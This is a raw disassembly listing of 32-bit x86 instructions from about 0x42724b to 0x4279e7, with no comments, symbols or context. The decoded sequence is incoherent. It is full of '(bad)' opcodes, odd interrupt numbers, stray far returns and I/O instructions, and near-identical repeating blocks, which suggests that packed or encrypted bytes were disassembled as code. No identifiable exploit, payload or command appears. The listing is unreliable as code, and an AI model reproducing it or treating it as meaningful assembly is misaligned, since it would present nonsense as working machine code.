  42724b:	adc    ebp,ecx
  42724d:	mov    ebp,ecx
  42724f:	xchg   esi,eax
  427250:	adc    ebp,ecx
  427252:	and    bh,BYTE PTR [ebx]
  427254:	(bad)  
  427256:	(bad)  
  427258:	jmp    0x4271ec
  42725a:	shr    edx,cl
  42725c:	sub    BYTE PTR [ebx+0x13],dl
  42725f:	retf   0x4d8c
  427262:	push   ebp
  427263:	pusha  
  427264:	jge    0x427295
  427266:	push   es
  427267:	cmc    
  427268:	add    BYTE PTR [eax-0x12893280],0xcd
  42726f:	(bad)  
  427270:	in     eax,dx
  427271:	int    0x89
  427273:	int    0x80
  427275:	cmp    esi,eax
  427277:	shl    edx,cl
  427279:	sub    BYTE PTR [ebx],bh
  42727b:	jns    0x427250
  42727d:	mov    ebp,0xcad35392
  427282:	je     0x427209
  427284:	ror    ch,1
  427286:	lea    edx,[ecx*8+0x1496cd89]
  42728d:	int    0x22
  42728f:	cmp    ecx,DWORD PTR [edi]
  427291:	shr    ebx,cl
  427293:	xchg   edx,eax
  427294:	cmp    ebx,ecx
  427296:	shr    edx,cl
  427298:	sub    BYTE PTR [ebx+0x13],dl
  42729b:	retf   0x4d8c
  42729e:	rol    BYTE PTR [edx-0x2d],1
  4272a1:	int    0x8d
  4272a3:	cmc    
  4272a4:	int    0x89
  4272a6:	int    0x96
  4272a8:	cmc    
  4272a9:	int    0x22
  4272ab:	cmp    ecx,DWORD PTR [edi]
  4272ad:	shr    ebx,cl
  4272af:	xchg   edx,eax
  4272b0:	cmp    ebx,ecx
  4272b2:	shr    edx,cl
  4272b4:	sub    BYTE PTR [ebx+0x13],dl
  4272b7:	retf   0x4d8c
  4272ba:	ror    BYTE PTR [edx-0x2d],1
  4272bd:	int    0x8d
  4272bf:	adc    al,0xcd
  4272c1:	mov    ebp,ecx
  4272c3:	xchg   esi,eax
  4272c4:	adc    al,0xcd
  4272c6:	and    bh,BYTE PTR [ebx]
  4272c8:	(bad)  
  4272ca:	(bad)  
  4272cc:	jmp    0x427260
  4272ce:	shr    edx,cl
  4272d0:	sub    BYTE PTR [ebx+0x13],dl
  4272d3:	retf   0x4d8c
  4272d6:	push   ebp
  4272d7:	pusha  
  4272d8:	jge    0x427309
  4272da:	push   es
  4272db:	add    DWORD PTR [eax+0x76cd8080],eax
  4272e1:	in     eax,dx
  4272e2:	int    0x8d
  4272e4:	in     eax,dx
  4272e5:	int    0x89
  4272e7:	int    0x80
  4272e9:	cmp    esi,eax
  4272eb:	shl    edx,cl
  4272ed:	sub    BYTE PTR [ebx],bh
  4272ef:	jns    0x4272c4
  4272f1:	mov    ebp,0xcad35392
  4272f6:	je     0x42727d
  4272f8:	ror    ch,1
  4272fa:	(bad)  
  4272fb:	cmc    
  4272fc:	int    0x89
  4272fe:	int    0x96
  427300:	cmc    
  427301:	int    0x22
  427303:	cmp    ecx,DWORD PTR [edi]
  427305:	shr    ebx,cl
  427307:	xchg   edx,eax
  427308:	cmp    ebx,ecx
  42730a:	shr    edx,cl
  42730c:	sub    BYTE PTR [ebx+0x13],dl
  42730f:	retf   0x4d8c
  427312:	rol    BYTE PTR [edx-0x2d],1
  427315:	int    0x8d
  427317:	adc    ebp,ecx
  427319:	mov    ebp,ecx
  42731b:	xchg   esi,eax
  42731c:	adc    ebp,ecx
  42731e:	and    bh,BYTE PTR [ebx]
  427320:	psrlq  mm5,mm3
  427323:	xchg   edx,eax
  427324:	cmp    ebx,ecx
  427326:	shr    edx,cl
  427328:	sub    BYTE PTR [ebx+0x13],dl
  42732b:	retf   0x4d8c
  42732e:	ror    BYTE PTR [edx-0x2d],1
  427331:	int    0x8d
  427333:	in     eax,dx
  427334:	int    0x89
  427336:	int    0x96
  427338:	in     eax,dx
  427339:	int    0x22
  42733b:	cmp    ecx,DWORD PTR [edi]
  42733d:	cmp    ebx,ecx
  42733f:	shr    ebx,cl
  427341:	xchg   edx,eax
  427342:	shr    edx,cl
  427344:	sub    BYTE PTR [ebx+0x13],dl
  427347:	retf   0x4d8c
  42734a:	push   ebp
  42734b:	pusha  
  42734c:	jge    0x427324
  42734e:	xor    bh,cl
  427350:	jbe    0x427322
  427352:	jo     0x427311
  427354:	outs   dx,DWORD PTR ds:[esi]
  427355:	lods   eax,DWORD PTR ds:[esi]
  427356:	add    BYTE PTR [eax],al
  427358:	int    0x8d
  42735a:	pop    ebp
  42735b:	inc    ebx
  42735c:	rcl    esp,cl
  42735e:	push   ss
  42735f:	int    0x76
  427361:	std    
  427362:	int    0x8d
  427364:	std    
  427365:	cmp    esi,eax
  427367:	cmp    edi,DWORD PTR [ecx-0x2d]
  42736a:	repnz sub bl,dl
  42736d:	mov    ebp,0xad35392
  427372:	jbe    0x427321
  427374:	int    0x76
  427376:	stc    
  427377:	int    0xa6
  427379:	stc    
  42737a:	int    0x76
  42737c:	stc    
  42737d:	int    0x8d
  42737f:	stc    
  427380:	cmp    ebp,DWORD PTR [ecx-0x132c36c5]
  427386:	xchg   edx,eax
  427387:	shr    DWORD PTR [ebp-0x7862acd8],cl
  42738d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42738e:	gs int 0x76
  427391:	xchg   ebp,eax
  427392:	cmp    ecx,DWORD PTR [edi]
  427394:	add    al,0xf2
  427396:	std    
  427397:	add    al,0xad
  427399:	std    
  42739a:	shr    esp,cl
  42739c:	sub    BYTE PTR [edi+0x12db537d],al
  4273a2:	hlt    
  4273a3:	dec    ecx
  4273a4:	and    DWORD PTR [esi-0x28932cb],eax
  4273aa:	int    0x8d
  4273ac:	std    
  4273ad:	cmp    esi,eax
  4273af:	cmp    edi,DWORD PTR [ecx-0x2d]
  4273b2:	repnz sub bl,dl
  4273b5:	mov    ebp,0xcdd35392
  4273ba:	lea    ebp,[ebp+0x52f7d43]
  4273c0:	push   ds
  4273c1:	std    
  4273c2:	add    BYTE PTR [eax],al
  4273c4:	int    0x76
  4273c6:	std    
  4273c7:	int    0x8d
  4273c9:	std    
  4273ca:	cmp    edi,DWORD PTR [ecx+0x3b]
  4273cd:	lock shl edx,cl
  4273d0:	sub    bl,dl
  4273d2:	mov    ebp,0xcdd35392
  4273d7:	lea    ebp,[ebp+0x1ad67d43]
  4273dd:	int    0x76
  4273df:	stc    
  4273e0:	int    0x8d
  4273e2:	stc    
  4273e3:	cmp    edi,DWORD PTR [ecx+0x3b]
  4273e6:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  4273ed:	push   ebx
  4273ee:	shr    ebx,cl
  4273f0:	jle    0x427373
  4273f2:	add    BYTE PTR [eax+0x5b6324c0],0x0
  4273f9:	(bad)  
  4273fa:	popf   
  4273fb:	iret   
  4273fc:	jbe    0x427413
  4273fe:	jo     0x4273bd
  427400:	jge    0x4273dd
  427402:	add    BYTE PTR [eax],al
  427404:	int    0x76
  427406:	std    
  427407:	int    0x8d
  427409:	std    
  42740a:	cmp    edi,DWORD PTR [ecx+0x3b]
  42740d:	lock shl edx,cl
  427410:	sub    bl,dl
  427412:	mov    ebp,0xcdd35392
  427417:	lea    esp,[ebp+0x5bd4d343]
  42741d:	int    0x76
  42741f:	stc    
  427420:	int    0x8d
  427422:	stc    
  427423:	cmp    edi,DWORD PTR [ecx+0x3b]
  427426:	lock shl edx,cl
  427429:	sub    bl,dl
  42742b:	mov    ebp,0xcdd35392
  427430:	lea    esp,[ebp+0x26d4d343]
  427436:	int    0x76
  427438:	stc    
  427439:	int    0x8d
  42743b:	stc    
  42743c:	cmp    edi,DWORD PTR [ecx+0x3b]
  42743f:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427446:	push   ebx
  427447:	shl    DWORD PTR [eax+0x5b],cl
  42744a:	iret   
  42744b:	jbe    0x427462
  42744d:	jo     0x42740c
  42744f:	das    
  427450:	cli    
  427451:	add    BYTE PTR [eax],al
  427453:	int    0x76
  427455:	std    
  427456:	int    0x8d
  427458:	std    
  427459:	cmp    edi,DWORD PTR [ecx+0x3b]
  42745c:	lock sar DWORD PTR [ebp+0x28f2d392],cl
  427463:	push   ebx
  427464:	shl    DWORD PTR [eax+0x5b],cl
  427467:	iret   
  427468:	jbe    0x42747f
  42746a:	jo     0x427429
  42746c:	sti    
  42746d:	stc    
  42746e:	add    BYTE PTR [eax],al
  427470:	int    0x76
  427472:	popf   
  427473:	xchg   ebp,eax
  427475:	or     dh,BYTE PTR [esi+0x14]
  427478:	add    dh,dl
  42747a:	cmp    eax,0xcd14d600
  42747f:	jbe    0x4274b6
  427481:	xchg   DWORD PTR [esi-0x78],esi
  427484:	jo     0x427443
  427486:	push   edx
  427487:	fild   DWORD PTR [eax]
  427489:	add    ch,cl
  42748b:	jbe    0x42748a
  42748d:	int    0x8d
  42748f:	std    
  427490:	cmp    edi,DWORD PTR [ecx+0x3b]
  427493:	lock shl edx,cl
  427496:	sub    bl,dl
  427498:	mov    ebp,0xcdd35392
  42749d:	lea    esp,[ebp-0x592b2cbd]
  4274a3:	int    0x76
  4274a5:	stc    
  4274a6:	int    0x8d
  4274a8:	stc    
  4274a9:	cmp    edi,DWORD PTR [ecx+0x3b]
  4274ac:	lock shl edx,cl
  4274af:	sub    bl,dl
  4274b1:	mov    ebp,0xcdd35392
  4274b6:	lea    esp,[ebp+0x32d4d343]
  4274bc:	int    0x76
  4274be:	stc    
  4274bf:	int    0x8d
  4274c1:	stc    
  4274c2:	cmp    edi,DWORD PTR [ecx-0x2d]
  4274c5:	mov    ebp,0xd3f03b92
  4274ca:	repnz sub BYTE PTR [ebx-0x2d],dl
  4274ce:	jo     0x4274d0
  4274d0:	(bad)  
  4274d1:	cmp    eax,0x873576cd
  4274d6:	jbe    0x427460
  4274d8:	jo     0x427497
  4274da:	add    eax,0xcd0000f9
  4274df:	jbe    0x4274de
  4274e1:	int    0x8d
  4274e3:	std    
  4274e4:	cmp    edi,DWORD PTR [ecx-0x2d]
  4274e7:	mov    ebp,0xd3f03b92
  4274ec:	repnz sub BYTE PTR [ebx-0x2d],dl
  4274f0:	jo     0x4274f2
  4274f2:	(bad)  
  4274f3:	cmp    eax,0x873576cd
  4274f8:	jbe    0x427482
  4274fa:	jo     0x4274b9
  4274fc:	jb     0x4274f7
  4274fe:	add    BYTE PTR [eax],al
  427500:	int    0x8d
  427502:	inc    ebp
  427503:	int    0x76
  427505:	inc    ebp
  427506:	cmp    ecx,ecx
  427508:	cmp    ecx,DWORD PTR [edi]
  42750a:	shr    ebx,cl
  42750c:	xchg   edx,eax
  42750d:	shr    DWORD PTR [ebp-0x322cacd8],cl
  427513:	lea    ebp,ds:0x803fd33b
  427519:	add    DWORD PTR [eax+0x3614d480],0x80800180
  427523:	jo     0x427525
  427525:	(bad)  
  427526:	cmp    eax,0x87358dcd
  42752b:	lea    ecx,[eax+0xa95abd]
  427531:	add    ch,cl
  427533:	jbe    0x427565
  427535:	int    0x8d
  427537:	cmp    eax,0x76cd8881
  42753c:	cmp    eax,0xabd7687
  427541:	jbe    0x427500
  427543:	int    0x76
  427545:	stc    
  427546:	int    0x8d
  427548:	stc    
  427549:	cmp    esi,eax
  42754b:	shl    edx,cl
  42754d:	sub    BYTE PTR [ebx],bh
  42754f:	jns    0x427524
  427551:	mov    ebp,0xcdd35392
  427556:	lea    edi,[ebp-0x322c2ed1]
  42755c:	(bad)  
  42755d:	std    
  42755e:	int    0x96
  427560:	std    
  427561:	cmp    ecx,DWORD PTR [edi]
  427563:	cmp    ebx,ecx
  427565:	shr    ebx,cl
  427567:	xchg   edx,eax
  427568:	shr    edx,cl
  42756a:	sub    BYTE PTR [ebx+0x13],dl
  42756d:	xchg   DWORD PTR [ebp+0x2fd343f1],ecx
  427573:	or     edi,DWORD PTR [ecx]
  427575:	cli    
  427576:	add    BYTE PTR [eax],al
  427578:	int    0x76
  42757a:	mov    BYTE PTR [edx-0x2d349c58],ch
  427580:	xor    BYTE PTR [eax+0x4edcd96],al
  427586:	in     eax,dx
  427587:	adc    al,0x5b
  427589:	cwde   
  42758a:	call   0xcd34:0x76cd6d3b
  427591:	add    DWORD PTR ds:0xcd808081,ebp
  427597:	xchg   esi,eax
  427598:	mov    ch,cl
  42759a:	or     ch,0xd6
  42759d:	dec    esp
  42759e:	int    0xe6
  4275a0:	mov    ch,cl
  4275a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275a3:	dec    esp
  4275a4:	or     dh,BYTE PTR [esi-0x3]
  4275a7:	pop    edi
  4275a8:	jnp    0x4275e1
  4275aa:	ficom  WORD PTR [ebx]
  4275ac:	cmp    esp,ebx
  4275ae:	pop    ebp
  4275af:	mov    ebp,0x3b25230a
  4275b4:	adc    DWORD PTR [edi],ebp
  4275b6:	inc    ebp
  4275b7:	sti    
  4275b8:	xchg   edx,eax
  4275b9:	shr    ecx,cl
  4275bb:	sub    BYTE PTR [edx],dl
  4275bd:	clc    
  4275be:	add    BYTE PTR [eax-0x102c9380],0x92
  4275c5:	cmp    ebx,ebp
  4275c7:	push   ebx
  4275c8:	clc    
  4275c9:	int    0xe6
  4275cb:	sbb    al,0x53
  4275cd:	aad    0x43
  4275cf:	(bad)  
  4275d1:	sbb    eax,DWORD PTR [ebx-0xc]
  4275d4:	(bad)  
  4275d5:	das    
  4275d6:	adc    cl,BYTE PTR [ebp+0x59]
  4275d9:	je     0x427585
  4275db:	push   edi
  4275dc:	ja     0x4275a3
  4275de:	xchg   edi,eax
  4275df:	shr    ebx,0xd9
  4275e2:	add    DWORD PTR [eax+0x3096cd80],0xcd14d6cd
  4275ec:	xchg   esi,eax
  4275ed:	mov    ch,cl
  4275ef:	(bad)  
  4275f0:	dec    esp
  4275f1:	int    0x96
  4275f3:	mov    ch,cl
  4275f5:	(bad)  
  4275f6:	dec    esp
  4275f7:	int    0xe6
  4275f9:	mov    ch,cl
  4275fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4275fc:	dec    esp
  4275fd:	cmp    edx,DWORD PTR [ecx]
  4275ff:	cmp    esp,ebx
  427601:	das    
  427602:	inc    ebp
  427603:	sti    
  427604:	xchg   edx,eax
  427605:	shr    ecx,cl
  427607:	sub    BYTE PTR [edx],dl
  427609:	clc    
  42760a:	add    BYTE PTR [eax-0x22c49380],0x53
  427611:	aad    0xd3
  427613:	out    dx,eax
  427614:	xchg   edx,eax
  427615:	push   ebx
  427616:	clc    
  427617:	int    0xe6
  427619:	xor    ch,cl
  42761b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42761c:	adc    al,0x3b
  42761e:	popf   
  42761f:	int    0x76
  427621:	xor    BYTE PTR [ebx],bh
  427623:	cli    
  427624:	int    0x8d
  427626:	adc    al,0x2f
  427628:	inc    ebp
  427629:	loope  0x4275bd
  42762b:	shr    DWORD PTR [ebp+0x53cb3b28],cl
  427631:	cli    
  427632:	push   esi
  427633:	add    BYTE PTR [eax-0x132c9380],0x92
  42763a:	push   ebx
  42763b:	popf   
  42763c:	int    0x76
  42763e:	mov    BYTE PTR [edi-0x320be427],al
  427644:	bswap  ebp
  427646:	(bad)  
  427647:	dec    esp
  427648:	int    0xe6
  42764a:	xor    ch,cl
  42764c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42764d:	adc    al,0x4
  42764f:	lods   eax,DWORD PTR ds:[esi]
  427650:	std    
  427651:	add    al,0xe9
  427653:	std    
  427654:	shr    ebx,cl
  427656:	sub    BYTE PTR [ebx],bh
  427658:	ficom  DWORD PTR [esi-0x2c]
  42765b:	aaa    
  42765c:	ficom  WORD PTR [ebx]
  42765e:	adc    dh,bh
  427660:	mov    ebp,0x1225230a
  427665:	clc    
  427666:	aam    0x37
  427668:	ficom  WORD PTR [ebx]
  42766a:	adc    dh,ah
  42766c:	mov    ebp,0x8725230a
  427671:	leave  
  427672:	sbb    esi,esp
  427674:	push   ebx
  427675:	jge    0x4276ca
  427677:	cdq    
  427678:	pop    ebp
  427679:	mov    ebp,0x1225230a
  42767e:	add    dl,dh
  427680:	aaa    
  427681:	ficom  WORD PTR [ebx]
  427683:	cmp    esi,ecx
  427685:	adc    bh,dl
  427687:	out    0x37,al
  427689:	ficom  WORD PTR [ebx]
  42768b:	(bad)  
  42768c:	sbb    eax,DWORD PTR [ebx-0xf]
  42768f:	(bad)  
  427690:	das    
  427691:	adc    dl,BYTE PTR [esi-0x1]
  427694:	das    
  427695:	stos   DWORD PTR es:[edi],eax
  427696:	push   es
  427697:	in     eax,0x9b
  427699:	xchg   edi,eax
  42769a:	imul   bl
  42769c:	and    al,0x81
  42769e:	add    BYTE PTR [eax-0x32776933],0xd6
  4276a5:	dec    esp
  4276a6:	int    0xa6
  4276a8:	mov    ch,cl
  4276aa:	out    0x4c,al
  4276ac:	cmp    edx,DWORD PTR [ecx]
  4276ae:	pop    edi
  4276af:	jnp    0x4276e8
  4276b1:	ficom  WORD PTR [ebx]
  4276b3:	cmp    esp,ebx
  4276b5:	das    
  4276b6:	inc    ebp
  4276b7:	sti    
  4276b8:	xchg   edx,eax
  4276b9:	shr    edi,cl
  4276bb:	xchg   edx,eax
  4276bc:	cmp    eax,DWORD PTR [eax]
  4276be:	shl    ebp,cl
  4276c0:	sub    BYTE PTR [edx],cl
  4276c2:	(bad)  
  4276c3:	cmc    
  4276c4:	push   ebx
  4276c5:	fxch   st(5)
  4276c7:	out    0xf5,al
  4276c9:	imul   eax,DWORD PTR [eax+0x3b6c8080],0xcdfc53a9
  4276d3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276d4:	and    al,0xcd
  4276d6:	and    ecx,DWORD PTR [edx]
  4276d8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4276d9:	adc    DWORD PTR [ebx-0x1e],eax
  4276dc:	(bad)  
  4276dd:	xchg   BYTE PTR [ebx],bh
  4276df:	fiadd  DWORD PTR [ebx-0x27]
  4276e2:	aam    0x20
  4276e4:	add    dh,dl
  4276e6:	xor    al,0xcd
  4276e8:	(bad)  
  4276e9:	and    al,0x0
  4276eb:	(bad)  
  4276ec:	sub    al,0x0
  4276ee:	(bad)  
  4276ef:	std    
  4276f0:	add    BYTE PTR [eax-0x43],bl
  4276f3:	sub    edi,eax
  4276f5:	add    BYTE PTR [eax],al
  4276f7:	or     al,BYTE PTR [esi-0x7f7f9615]
  4276fd:	or     ch,0x96
  427700:	mov    ch,cl
  427702:	out    0x4c,al
  427704:	cmp    edi,ecx
  427706:	cmp    esp,ebx
  427708:	das    
  427709:	inc    ebp
  42770a:	add    edx,DWORD PTR [edx+0xa9210d3]
  427710:	out    0xf5,al
  427712:	int    0xe6
  427714:	mov    ch,cl
  427716:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427717:	dec    esp
  427718:	shr    ecx,cl
  42771a:	sub    BYTE PTR [ebx],bh
  42771c:	dec    ebp
  42771e:	(bad)  
  42771f:	cmc    
  427720:	cmp    ebx,ebp
  427722:	push   ebx
  427723:	clc    
  427724:	int    0xe6
  427726:	xor    BYTE PTR [ebx],bh
  427728:	cli    
  427729:	push   ebx
  42772a:	aad    0xcd
  42772c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42772d:	adc    al,0x3b
  42772f:	popf   
  427730:	int    0xc9
  427732:	int    0xe6
  427734:	xor    ch,cl
  427736:	or     al,0xcd
  427738:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427739:	adc    al,0x2f
  42773b:	inc    ebp
  42773c:	jge    0x4276d0
  42773e:	shr    ecx,cl
  427740:	sub    BYTE PTR [ebx],bh
  427742:	fst    st(3)
  427744:	jmp    0x4276d8
  427746:	adc    bh,al
  427748:	add    BYTE PTR [eax-0x3aac9380],0x53
  42774f:	lock inc ebx
  427751:	icebp  
  427752:	(bad)  
  427753:	sbb    BYTE PTR [ebx+0x2],al
  427756:	(bad)  
  427757:	and    dh,BYTE PTR [ecx+0x761dfc3b]
  42775d:	mov    esi,0xdd8bf56d
  427762:	(bad)  
  427763:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427764:	cmp    edi,esp
  427766:	sbb    eax,0xcd62ec76
  42776b:	jbe    0x4276f5
  42776d:	int    0x8d
  42776f:	dec    esp
  427770:	int    0x96
  427772:	mov    ch,cl
  427774:	(bad)  
  427775:	dec    esp
  427776:	adc    al,BYTE PTR [edx]
  427778:	mov    ebp,0x5625230a
  42777d:	jnp    0x4277b6
  42777f:	ficom  WORD PTR [ebx]
  427781:	das    
  427782:	inc    ebp
  427783:	jge    0x427717
  427785:	int    0xfb
  427787:	cmp    eax,DWORD PTR [eax]
  427789:	cmp    ebx,edx
  42778b:	sar    DWORD PTR [ecx-0x2cfcc4d8],cl
  427791:	jmp    0x427725
  427793:	adc    dh,bh
  427795:	add    BYTE PTR [eax-0x36ac9380],0x53
  42779c:	divps  xmm6,XMMWORD PTR [esi-0x3]
  4277a0:	(bad)  
  4277a1:	test   BYTE PTR [ebx-0x1d],al
  4277a4:	aam    0x4c
  4277a6:	adc    al,BYTE PTR [esi-0x3e]
  4277a9:	gs sub al,0x1
  4277ac:	jo     0x4277e8
  4277ae:	mov    edx,0x124aece0
  4277b3:	ss inc edx
  4277b5:	das    
  4277b6:	sbb    edx,esi
  4277b8:	mov    ebx,0xaa029f75
  4277bd:	test   al,0x63
  4277bf:	retf   
  4277c0:	shr    BYTE PTR [eax+eax*4],cl
  4277c3:	xchg   esi,eax
  4277c4:	int    0xed
  4277c6:	add    al,0xed
  4277c8:	dec    esp
  4277c9:	int    0x76
  4277cb:	mov    ch,cl
  4277cd:	lea    ecx,[edi+ebp*1+0x45]
  4277d1:	jge    0x427765
  4277d3:	shr    ebx,cl
  4277d5:	xchg   edx,eax
  4277d6:	int    0x8d
  4277d8:	mov    ch,cl
  4277da:	xchg   esi,eax
  4277db:	dec    esp
  4277dc:	cwde   
  4277dd:	shl    edx,cl
  4277df:	sub    ch,cl
  4277e1:	lea    ebx,[ecx+ebp*2]
  4277e4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4277e5:	mov    esi,0x793b4229
  4277ea:	cmp    ebx,edx
  4277ec:	push   ebx
  4277ed:	ror    BYTE PTR [edx],cl
  4277ef:	or     ebp,0x1cd2476
  4277f5:	xor    eax,0xcd808081
  4277fa:	mov    ch,cl
  4277fc:	jbe    0x427822
  4277fe:	int    0x1
  427800:	xor    eax,0xcd808081
  427805:	add    BYTE PTR [edi-0x72329b92],0x24
  42780c:	int    0xa
  42780e:	adc    DWORD PTR [ecx+0x7ecd8080],eax
  427814:	adc    al,0xc0
  427816:	test   BYTE PTR [eax+eax*4+0x808050],bh
  42781d:	nop
  42781e:	jo     0x427882
  427820:	add    bl,ah
  427822:	or     cl,BYTE PTR [ebx-0x32778933]
  427828:	lea    ecx,[edi+ebp*1+0x45]
  42782c:	jge    0x4277c0
  42782e:	shr    ebx,cl
  427830:	xchg   edx,eax
  427831:	int    0x8d
  427833:	mov    ch,cl
  427835:	xchg   esi,eax
  427836:	dec    esp
  427837:	add    dh,dl
  427839:	and    al,0x3b
  42783b:	jns    0x427878
  42783d:	ficom  DWORD PTR [ebx-0x2e]
  427840:	or     dh,BYTE PTR [esi-0x3]
  427843:	iret   
  427844:	jbe    0x427843
  427846:	jo     0x4277e2
  427848:	add    dh,dl
  42784a:	sbb    al,0xd3
  42784c:	repnz sub BYTE PTR [eax],al
  42784f:	(bad)  
  427850:	adc    al,0x0
  427852:	(bad)  
  427853:	xor    BYTE PTR [eax],al
  427855:	(bad)  
  427856:	dec    esp
  427857:	add    dh,dl
  427859:	mov    BYTE PTR [ebp+0xfe2b],bh
  42785f:	int    0x76
  427861:	mov    ch,cl
  427863:	lea    ecx,[edi+ebp*1+0x45]
  427867:	jge    0x4277fb
  427869:	shr    ebx,cl
  42786b:	xchg   edx,eax
  42786c:	int    0x8d
  42786e:	mov    ch,cl
  427870:	xchg   esi,eax
  427871:	dec    esp
  427872:	cmp    edi,DWORD PTR [ecx+0x3b]
  427875:	fcmovbe st,st(3)
  427877:	repnz sub ch,cl
  42787a:	das    
  42787b:	push   ebx
  42787c:	rol    BYTE PTR [ebx+0x7d],cl
  42787f:	aam    0x36
  427881:	int    0x76
  427883:	xor    ch,cl
  427885:	lea    edx,[edi+ebp*1]
  427888:	inc    ebp
  427889:	jge    0x42781d
  42788b:	shr    ebx,cl
  42788d:	xchg   edx,eax
  42788e:	int    0x8d
  427890:	xor    ch,cl
  427892:	xchg   esi,eax
  427893:	adc    al,0x3b
  427895:	jns    0x4278d2
  427897:	fcmovbe st,st(3)
  427899:	repnz sub ch,cl
  42789c:	lea    ebx,[ebx+edx*2]
  42789f:	shr    BYTE PTR [edi],cl
  4278a1:	shl    DWORD PTR [esi-0x3],1
  4278a4:	or     al,BYTE PTR [ecx+0x1cd2cba8]
  4278aa:	adc    BYTE PTR [esi+0x5b71edcd],0x98
  4278b1:	call   0xcd3c:0xd6cd6d3b
  4278b8:	xchg   esi,eax
  4278b9:	inc    esp
  4278ba:	int    0xe6
  4278bc:	and    al,0x5d
  4278be:	mov    ebp,0x5f25230a
  4278c3:	jnp    0x4278fc
  4278c5:	ficom  WORD PTR [ebx]
  4278c7:	inc    ebx
  4278c8:	icebp  
  4278c9:	das    
  4278ca:	or     BYTE PTR [edi],al
  4278cc:	add    BYTE PTR [eax-0x4613080],0x82
  4278d3:	test   BYTE PTR [ebx-0xc],al
  4278d6:	jnp    0x4278be
  4278d8:	inc    ebx
  4278d9:	hlt    
  4278da:	(bad)  
  4278db:	mov    BYTE PTR [ebx-0xf],al
  4278de:	das    
  4278df:	add    eax,0x80809216
  4278e4:	adc    bh,bh
  4278e6:	jno    0x42791f
  4278e8:	ficom  WORD PTR [ebx]
  4278ea:	(bad)  
  4278eb:	mov    BYTE PTR [ebx-0xf],al
  4278ee:	das    
  4278ef:	add    eax,0x80809285
  4278f4:	adc    bh,bh
  4278f6:	xchg   esi,eax
  4278f7:	aaa    
  4278f8:	ficom  WORD PTR [ebx]
  4278fa:	(bad)  
  4278fb:	mov    BYTE PTR [ebx-0xf],al
  4278fe:	das    
  4278ff:	add    eax,0x808080f8
  427904:	adc    bh,bh
  427906:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427907:	aaa    
  427908:	ficom  WORD PTR [ebx]
  42790a:	(bad)  
  42790b:	test   BYTE PTR [ebx-0xf],al
  42790e:	aam    0x3e
  427910:	adc    bh,bh
  427912:	scas   al,BYTE PTR es:[edi]
  427913:	aaa    
  427914:	ficom  WORD PTR [ebx]
  427916:	(bad)  
  427917:	mov    BYTE PTR [ebx-0xf],al
  42791a:	das    
  42791b:	add    eax,0x808081db
  427920:	adc    bh,bh
  427922:	mov    dh,0x37
  427924:	ficom  WORD PTR [ebx]
  427926:	das    
  427927:	push   es
  427928:	into   
  427929:	add    DWORD PTR [eax+0x2ff14380],0x80809f05
  427933:	sub    bl,0x12
  427936:	add    DWORD PTR [eax+0x1cd60080],0x2cd600
  427940:	(bad)  
  427941:	adc    al,0x0
  427943:	(bad)  
  427944:	xor    BYTE PTR [eax],al
  427946:	(bad)  
  427947:	dec    esp
  427948:	add    dh,dl
  42794a:	mov    BYTE PTR [ebp+0xff77],bh
  427950:	jmp    0x427908
  427952:	add    DWORD PTR [eax-0x3900ed80],0xd613de37
  42795c:	mov    BYTE PTR [ebx-0xf],al
  42795f:	das    
  427960:	add    eax,0x80808019
  427965:	adc    bh,bh
  427967:	xchg   ecx,eax
  427968:	aaa    
  427969:	ficom  WORD PTR [ebx]
  42796b:	(bad)  
  42796c:	mov    BYTE PTR [ebx-0xf],al
  42796f:	das    
  427970:	add    eax,0x8080818e
  427975:	adc    bh,bh
  427977:	(bad)  
  427978:	aaa    
  427979:	ficom  WORD PTR [ebx]
  42797b:	(bad)  
  42797c:	test   BYTE PTR [ebx-0xf],al
  42797f:	aam    0x1c
  427981:	adc    bh,bh
  427983:	fidiv  WORD PTR [edi]
  427985:	ficom  WORD PTR [ebx]
  427987:	(bad)  
  427988:	mov    BYTE PTR [ebx-0xf],al
  42798b:	das    
  42798c:	add    eax,0x80808142
  427991:	adc    bh,bh
  427993:	out    0x37,al
  427995:	ficom  WORD PTR [ebx]
  427997:	in     al,dx
  427998:	iret   
  427999:	int    0x96
  42799b:	mov    ch,cl
  42799d:	(bad)  
  42799e:	dec    esp
  42799f:	int    0xe6
  4279a1:	mov    ch,cl
  4279a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279a4:	dec    esp
  4279a5:	cmp    edx,DWORD PTR [ecx]
  4279a7:	cmp    esp,ebx
  4279a9:	das    
  4279aa:	inc    ebp
  4279ab:	sti    
  4279ac:	xchg   edx,eax
  4279ad:	shr    ecx,cl
  4279af:	sub    BYTE PTR [edx],dl
  4279b1:	clc    
  4279b2:	add    BYTE PTR [eax-0x102c9380],0x92
  4279b9:	cmp    ebx,ebp
  4279bb:	push   ebx
  4279bc:	clc    
  4279bd:	int    0xe6
  4279bf:	mov    BYTE PTR [ebx-0x2b],dl
  4279c2:	int    0xa6
  4279c4:	dec    esp
  4279c5:	xchg   ecx,ebx
  4279c7:	sbb    esi,esp
  4279c9:	or     dl,BYTE PTR [esi+0x4cd60a88]
  4279cf:	int    0x96
  4279d1:	mov    ch,cl
  4279d3:	(bad)  
  4279d4:	dec    esp
  4279d5:	int    0xe6
  4279d7:	mov    ch,cl
  4279d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4279da:	dec    esp
  4279db:	cmp    edx,DWORD PTR [ecx]
  4279dd:	cmp    esp,ebx
  4279df:	das    
  4279e0:	inc    ebp
  4279e1:	sti    
  4279e2:	xchg   edx,eax
  4279e3:	shr    ecx,cl
  4279e5:	sub    BYTE PTR [ebx],bh
  4279e7:	fst    st(3)
